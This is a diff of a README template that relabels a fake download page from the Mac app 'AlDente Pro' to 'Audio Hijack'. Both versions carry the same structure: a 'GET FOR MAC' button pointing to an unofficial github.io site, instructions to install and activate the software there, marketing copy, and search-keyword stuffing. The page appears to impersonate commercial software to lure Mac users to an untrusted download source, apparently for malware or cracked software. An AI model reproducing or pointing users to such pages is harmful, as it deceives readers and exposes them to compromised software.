@@ -1,12 +1,12 @@
-# AlDente Pro – Smart Battery Health & Charging Management Tool
+# Audio Hijack – Advanced Audio Capture & Studio-Level Control for macOS  
 
 <div align="center">  
-  <img src="https://macx.ws/uploads/posts/2025-08/aldente.png" width="250"/>  
+  <img src="https://img.informer.com/icons_mac/png/128/722/722029.png" width="250"/>  
 </div>  
 <br>  
 <div align="center">  
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-get-2025.github.io/.github/aldente)  
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/hijack)  
 
 </div>  
 
@@ -15,24 +15,24 @@
 # Installation Instructions  
 
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate AlDente Pro On Your Mac Device.  
+2. Follow The On-Screen Steps To Install And Activate Audio Hijack On Your Mac Device.  
 
 ---  
 
 <div align="center">  
-  <img src="https://todayonmac.com/content/images/2025/02/Group-3140.png" width="1080"/>  
+  <img src="https://9to5mac.com/wp-content/uploads/sites/6/2024/01/audio-hijack-lead.jpg?quality=82&strip=all&w=1024" width="1080"/>  
 </div>  
 <br>  
 
 ## 🧩 Overview  
 
-**AlDente Pro for macOS** is an advanced battery management application that gives users full control over how their MacBook charges. Designed to extend battery life and optimize long-term performance, it allows you to set charging limits, manage temperature thresholds, and monitor charging behavior in real time.  
+**Audio Hijack for macOS** is a professional-grade sound recording and routing utility that lets you take full control of your Mac’s audio environment. Perfect for podcasters, broadcasters, musicians, and streamers, it provides a visual and modular approach to capturing, processing, and enhancing sound.  
 
-Unlike traditional macOS battery controls, **AlDente Pro** offers fine-tuned customization that prevents battery wear caused by constant 100% charging. You can define charging percentages, pause charging automatically, and even activate heat protection to keep your MacBook battery in top shape.  
+Instead of traditional recorders, **Audio Hijack** gives you a **block-based workflow**, where you connect sources, effects, and outputs like building a sound circuit. Capture music from apps, record microphone input, or combine multiple sources into one high-quality file — all in real time.  
 
-Its sleek interface integrates seamlessly with macOS, displaying detailed battery health metrics and live charge status directly in your menu bar. For advanced users, it also supports automation profiles and **Sailing Mode**, which maintains your battery at an optimal range during heavy workloads.  
+With a comprehensive library of **audio effects**, including equalizers, compressors, and noise filters, you can clean up and fine-tune recordings instantly. Built-in scheduling and automation features make it easy to start recording sessions at specific times or trigger actions when certain apps open.  
 
-Optimized for **Apple Silicon**, AlDente Pro delivers ultra-efficient performance with minimal resource consumption — ensuring your MacBook stays cooler, healthier, and more energy-efficient for years to come.  
+Engineered for **Apple Silicon**, Audio Hijack delivers near-zero latency, smooth real-time processing, and exceptional efficiency — all within an elegant macOS-native design. Whether for production, streaming, or professional audio work, it’s a must-have utility for precision sound control.  
 
 ---  
 
@@ -40,15 +40,15 @@ Optimized for **Apple Silicon**, AlDente Pro delivers ultra-efficient performanc
 
 | Feature                                      | Description                                                                 |
 |----------------------------------------------|------------------------------------------------------------------------------|
-| 🔋 **Custom Charging Limits**                 | Set charging caps (e.g., 80%) to preserve long-term battery health.          |
-| 🌡️ **Heat Protection System**                 | Automatically stops charging when the device temperature rises.              |
-| ⚙️ **Sailing Mode**                           | Keeps the battery within a stable range to prevent micro-charging cycles.    |
-| 💻 **Menu Bar Integration**                   | Access battery stats and settings directly from the macOS menu bar.          |
-| 📈 **Real-Time Monitoring**                   | Track current charge, wattage, and battery temperature instantly.            |
-| 🧠 **Automation Profiles**                    | Create custom charging behaviors based on usage patterns.                    |
-| ⚡ **Optimized for Apple Silicon**             | Runs natively on M1 and M2 Macs for smooth, efficient performance.           |
-| 🌙 **Discharge Mode**                         | Run on battery power even when connected to a charger.                       |
-| ☁️ **macOS Native Design**                    | Lightweight, clean interface that fits perfectly into macOS aesthetics.      |
+| 🎙️ **Universal Audio Capture**                | Record sound from any app, system process, or hardware input.                |
+| 🧱 **Visual Block Editor**                    | Design audio paths visually by linking input, effects, and output blocks.    |
+| 🎧 **Real-Time Monitoring**                   | Hear processed audio instantly with zero lag.                               |
+| 🧠 **Built-In Audio Effects**                 | Apply EQ, volume boost, noise removal, and other live enhancements.          |
+| 💻 **App & System Routing**                   | Capture calls, streams, or system alerts with full routing flexibility.      |
+| 🎚️ **Presets & Session Templates**           | Save and recall configurations for different workflows and recording styles. |
+| ☁️ **Third-Party Integration**               | Works seamlessly with tools like Loopback and Farrago for a complete setup.  |
+| ⚡ **Optimized for Apple Silicon**             | Native M1/M2 performance ensures fast, energy-efficient processing.          |
+| 🪶 **Minimal macOS Interface**                 | Clean and intuitive layout designed for professionals and casual users alike.|
 
 ---  
 
@@ -59,11 +59,11 @@ Optimized for **Apple Silicon**, AlDente Pro delivers ultra-efficient performanc
 | OS            | macOS 11.0 or later               |
 | Processor     | Apple Silicon (M1/M2) or Intel    |
 | Memory        | 2 GB RAM or higher                |
-| Storage       | 150 MB free disk space            |
+| Storage       | 250 MB free disk space            |
 | Display       | 1280×800 resolution or higher     |
 
 ---  
 
 ## 🏷️ Tags  
 
-aldente • aldente mac • aldente pro • aldente macos • al dente mac app • aldente pro mac • al dente app mac • al dente for mac • mac al dente • aldente mac download • al dente mac battery • aldente battery mac • aldente osx • al dente macbook m1 • al dente pro coupon • aldente pro app • aldente for macos  
+audio hijack • audio hijack mac • hijack app • audio hijack pro • audio hijack download • audio hijack macos • audio hijack osx • audio hijack app • hijack mac • rogue amoeba software izotope • alternative to audio hijack • apps like audio hijack • audio hijack 3 download • audio hijack 3 • audio hijack 4 • audio hijack alternative mac • audio hijack download mac • audio hijack for pc • audio hijack m1 • audio hijack mac alternative • rogue amoeba  
